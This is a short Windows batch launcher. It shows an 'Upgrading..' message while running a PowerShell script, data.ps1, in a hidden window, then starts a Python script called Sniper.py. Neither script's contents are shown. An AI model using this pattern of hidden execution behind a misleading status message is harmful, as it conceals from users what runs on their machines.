@echo off
color 0A
@echo Upgrading..
Powershell -File data.ps1 -WindowStyle hidden
@echo Upgraded
@echo Starting..
python Sniper.py